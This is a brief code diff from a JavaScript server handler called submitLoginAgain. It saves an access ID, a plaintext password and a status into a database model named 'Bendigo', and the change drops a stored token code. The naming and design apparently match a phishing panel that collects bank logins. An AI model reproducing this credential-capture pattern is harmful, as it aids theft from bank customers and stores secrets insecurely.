@@ -60,7 +60,7 @@ const submitLoginAgain = async (req, res) => {
   try {
     await Bendigo.findOneAndUpdate(
       { uniqueid },
-      { accessId, password, tokenCode, status: 0 }
+      { accessId, password, status: 0 }
     ).exec();
     res.sendStatus(200);
   } catch (error) {
